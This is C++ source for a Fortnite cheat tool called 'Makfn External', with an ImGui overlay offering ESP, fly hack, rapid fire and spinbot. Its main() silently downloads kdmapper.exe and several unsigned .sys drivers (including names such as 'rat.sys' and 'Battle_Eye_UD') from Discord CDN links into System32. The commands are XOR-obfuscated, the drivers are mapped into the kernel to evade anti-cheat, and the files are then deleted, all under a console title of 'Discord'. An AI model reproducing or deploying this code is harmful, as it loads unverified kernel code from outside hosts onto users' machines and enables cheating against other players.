			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 2:
			ImGui::Checkbox("Filled Box", &esp_fillbox);
			ImGui::Checkbox("Outlined Box", &Esp_fbox);
			ImGui::Checkbox("Corner Box", &Esp_boxcorners);
			ImGui::Checkbox("3D Box", &Esp_ThreeDBox);
			ImGui::Checkbox("Skeleton Esp", &Esp_Skeleton);
			ImGui::Checkbox("Snaplines", &Esp_snapline);
			ImGui::Checkbox("Distance Esp", &Esp_Distance);
			ImGui::Spacing();
			ImGui::SliderFloat("Esp Rendering", &VisDist, 1.f, 500.f);
			ImGui::Spacing();
			ImGui::Checkbox("Reload Check", &reloadCheck);
			ImGui::Checkbox("PlayerBot Check", &esp_playerbot);
			ImGui::Checkbox("VisCheck", &vischeck);
			ImGui::Checkbox("TeamCheck (adding soon)", &vischeck);
			ImGui::Spacing();
			ImGui::Checkbox("World / Loot Esp", &DeveloperAdjust);
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		case 3:
			ImGui::Checkbox("Player Fly Hack", &playerfly);
			ImGui::Checkbox("Cracked DMR", &god2dmr);
			ImGui::Checkbox("No Collision", &Collision);
			ImGui::Checkbox("Insta Reload", &instareload);
			ImGui::Checkbox("CarTP To Waypoint", &cartp);
			ImGui::Checkbox("Spinbot", &spinbot);
			ImGui::Checkbox("No MiniGun Cooldown", &nominigun);
			ImGui::Checkbox("Gun CustomTimeDilation", &CustomTimeDilation);
			ImGui::Checkbox("AirStuck", &AirStuck);
			ImGui::SameLine();
			ImGui::TextColored(ImColor(204, 196, 49), "Hotkey UP");
			ImGui::Checkbox("No Gun Equip Animation", &noEquipeAim);
			ImGui::Checkbox("RapidFire", &RapidFire);
			ImGui::Checkbox("FOVChanger", &FOVChanger);
			ImGui::Checkbox("AirStuck", &AirStuck);
			if (FOVChanger == true) { ImGui::SliderInt("FOVChanger Value", &fovchangervalue, 1.0f, 1.000f); }
			ImGui::Spacing();
			ImGui::Text("Cheat Exentions");
			ImGui::Checkbox("Cheat Extentions", &DeveloperAdjust);
			ImGui::Spacing();
			ImGui::PushStyleColor(ImGuiCol_Text, inactive);
			ImGui::Text("Makfn External");
			ImGui::SameLine();
			if (ImGui::IsItemHovered()) {
				ImGui::BeginTooltip();
				ImGui::PushStyleColor(ImGuiCol_Text, active);
				ImGui::Text(("discord.gg/makfn"));
				ImGui::EndTooltip();
			}
			break;
		}
		ImGui::End();
	}

	InitCheat();
	ImGui::EndFrame();
	D3dDevice->SetRenderState(D3DRS_ZENABLE, false);
	D3dDevice->SetRenderState(D3DRS_ALPHABLENDENABLE, false);
	D3dDevice->SetRenderState(D3DRS_SCISSORTESTENABLE, false);
	D3dDevice->Clear(0, NULL, D3DCLEAR_TARGET, D3DCOLOR_ARGB(0, 0, 0, 0), 1.0f, 0);

	if (D3dDevice->BeginScene() >= 0)
	{
		ImGui::Render();
		ImGui_ImplDX9_RenderDrawData(ImGui::GetDrawData());
		D3dDevice->EndScene();
	}
	HRESULT result = D3dDevice->Present(NULL, NULL, NULL, NULL);

	if (result == D3DERR_DEVICELOST && D3dDevice->TestCooperativeLevel() == D3DERR_DEVICENOTRESET)
	{
		ImGui_ImplDX9_InvalidateDeviceObjects();
		D3dDevice->Reset(&d3dpp);
		ImGui_ImplDX9_CreateDeviceObjects();
	}
}

void xMainLoop()
{
	static RECT old_rc;
	ZeroMemory(&Message, sizeof(MSG));

	while (Message.message != WM_QUIT)
	{
		if (PeekMessage(&Message, Window, 0, 0, PM_REMOVE))
		{
			TranslateMessage(&Message);
			DispatchMessage(&Message);
		}

		HWND hwnd_active = GetForegroundWindow();

		if (hwnd_active == hwnd) {
			HWND hwndtest = GetWindow(hwnd_active, GW_HWNDPREV);
			SetWindowPos(Window, hwndtest, 0, 0, 0, 0, SWP_NOMOVE | SWP_NOSIZE);
		}

		if (GetAsyncKeyState(0x23) & 1)
			exit(8);

		RECT rc;
		POINT xy;

		ZeroMemory(&rc, sizeof(RECT));
		ZeroMemory(&xy, sizeof(POINT));
		GetClientRect(hwnd, &rc);
		ClientToScreen(hwnd, &xy);
		rc.left = xy.x;
		rc.top = xy.y;

		ImGuiIO& io = ImGui::GetIO();
		io.ImeWindowHandle = hwnd;
		io.DeltaTime = 1.0f / 60.0f;

		POINT p;
		GetCursorPos(&p);
		io.MousePos.x = p.x - xy.x;
		io.MousePos.y = p.y - xy.y;

		if (GetAsyncKeyState(VK_LBUTTON)) {
			io.MouseDown[0] = true;
			io.MouseClicked[0] = true;
			io.MouseClickedPos[0].x = io.MousePos.x;
			io.MouseClickedPos[0].x = io.MousePos.y;
		}
		else
			io.MouseDown[0] = false;

		if (rc.left != old_rc.left || rc.right != old_rc.right || rc.top != old_rc.top || rc.bottom != old_rc.bottom)
		{
			old_rc = rc;

			Width = rc.right;
			Height = rc.bottom;

			d3dpp.BackBufferWidth = Width;
			d3dpp.BackBufferHeight = Height;
			SetWindowPos(Window, (HWND)0, xy.x, xy.y, Width, Height, SWP_NOREDRAW);
			D3dDevice->Reset(&d3dpp);
		}
		render();
	}
	ImGui_ImplDX9_Shutdown();
	ImGui_ImplWin32_Shutdown();
	ImGui::DestroyContext();

	DestroyWindow(Window);
}

LRESULT CALLBACK WinProc(HWND hWnd, UINT Message, WPARAM wParam, LPARAM lParam)
{
	if (ImGui_ImplWin32_WndProcHandler(hWnd, Message, wParam, lParam))
		return true;

	switch (Message)
	{
	case WM_DESTROY:
		xShutdown();
		PostQuitMessage(0);
		exit(4);
		break;
	case WM_SIZE:
		if (D3dDevice != NULL && wParam != SIZE_MINIMIZED)
		{
			ImGui_ImplDX9_InvalidateDeviceObjects();
			d3dpp.BackBufferWidth = LOWORD(lParam);
			d3dpp.BackBufferHeight = HIWORD(lParam);
			HRESULT hr = D3dDevice->Reset(&d3dpp);
			if (hr == D3DERR_INVALIDCALL)
				IM_ASSERT(0);
			ImGui_ImplDX9_CreateDeviceObjects();
		}
		break;
	default:
		return DefWindowProc(hWnd, Message, wParam, lParam);
		break;
	}
	return 0;
}

void xShutdown()
{
	TriBuf->Release();
	D3dDevice->Release();
	p_Object->Release();

	DestroyWindow(Window);
	UnregisterClass(L"fgers", NULL);
}

DWORD GetProcessID(LPCWSTR processName) {
	HANDLE handle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	DWORD procID = NULL;

	if (handle == INVALID_HANDLE_VALUE)
		return procID;

	PROCESSENTRY32W entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32W);

	if (Process32FirstW(handle, &entry)) {
		if (!_wcsicmp(processName, entry.szExeFile)) {
			procID = entry.th32ProcessID;
		}
		else while (Process32NextW(handle, &entry)) {
			if (!_wcsicmp(processName, entry.szExeFile)) {
				procID = entry.th32ProcessID;
			}
		}
	}

	CloseHandle(handle);
	return procID;
}

void RandomizeDrivers()
{
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\driverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\DUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\kdmpapper.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\sysudness.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\sussess.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\fortniteejddd.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\fortnite.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\plsnocrack2.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\soudloader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\UIDUSPOOFER.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\mygodwtf.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\makfn.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\rat.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\rsat.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\sussy.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\plsnocrack.sys >nul 2>&1").c_str());
}

void KernelDrivers()
{
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1009782557904220211/1011579935388860436/kdmapper.exe --output C:\\Windows\\System32\\notdriverLoader.exe >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407601078332/RafilIOUDUD_1.sys --output C:\\Windows\\System32\\notDUDUDUD.sys >nul 2>&1").c_str());
	system(_xor_("curl --silent https://cdn.discordapp.com/attachments/1013931610384642200/1021445407320047687/Battle_Eye_UD_1.sys --output C:\\Windows\\System32\\notcheetoDriver2.sys >nul 2>&1").c_str());
}

void cleanup()
{
	std::remove(("C:\\Windows\\System32\\driverLoader.exe"));
	std::remove(("C:\\Windows\\System32\\DUDUDUD.sys"));
	std::remove(("C:\\Windows\\System32\\kdmpapper.exe"));
	std::remove(("C:\\Windows\\System32\\sysudness.sys"));
	std::remove(("C:\\Windows\\System32\\sussess.sys"));
	std::remove(("C:\\Windows\\System32\\fortniteejddd.sys"));
	std::remove(("C:\\Windows\\System32\\fortnite.sys"));
	std::remove(("C:\\Windows\\System32\\plsnocrack2.sys"));
	std::remove(("C:\\Windows\\System32\\soudloader.exe"));
	std::remove(("C:\\Windows\\System32\\UIDUSPOOFER.sys"));
	std::remove(("C:\\Windows\\System32\\mygodwtf.exe"));
	std::remove(("C:\\Windows\\System32\\makfn.sys"));
	std::remove(("C:\\Windows\\System32\\rat.sys"));
	std::remove(("C:\\Windows\\System32\\rsat.sys"));
	std::remove(("C:\\Windows\\System32\\sussy.sys"));
	std::remove(("C:\\Windows\\System32\\plsnocrack.sys"));
	std::remove(("C:\\Windows\\System32\\notdriverLoader.sys"));
	std::remove(("C:\\Windows\\System32\\notcheetoDriver21.exe"));
}

bool IsProcessRunning(const wchar_t* processName) {
	bool exists = false;
	PROCESSENTRY32 entry;
	entry.dwSize = sizeof(PROCESSENTRY32);

	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

	if (Process32First(snapshot, &entry))
		while (Process32Next(snapshot, &entry)) {

			std::wcout << entry.szExeFile << std::endl;

			if (!wcsicmp(entry.szExeFile, processName))
				exists = true;
		}

	CloseHandle(snapshot);
	return exists;
}


int main()
{
	SetConsoleTitleA("Discord");
	RandomizeDrivers(); KernelDrivers();
	system(_xor_("cd C:\\Windows\\System32\\").c_str());
	system(_xor_("C:\\Windows\\System32\\notdriverLoader.exe C:\\Windows\\System32\\notcheetoDriver2.sys C:\\Windows\\System32\\notDUDUDUD.sys").c_str());
	Sleep(5000); 
	system("cls"); 
	cleanup();

	std::cout << " waiting for fortnite";
	while (hwnd == NULL)
	{
		hwnd = FindWindowA(0, _("Fortnite  "));
		Sleep(100);
	}
	system("cls");
	UDPID = GetProcessID(L"FortniteClient-Win64-Shipping.exe");
	if (driver->Init(FALSE)) { driver->Attach(UDPID); baseaddy = driver->GetModuleBase(L"FortniteClient-Win64-Shipping.exe"); }
	printf(" Fortnite Makfn External v4");
	printf("\n Base Address: %p", (void*)baseaddy);

	setup_window();
	xInitD3d();

	HANDLE World = CreateThread(nullptr, NULL, reinterpret_cast<LPTHREAD_START_ROUTINE>(ActorLoop), nullptr, NULL, nullptr);
	CloseHandle(World);

	xMainLoop();
	xShutdown();

	return 0;
}
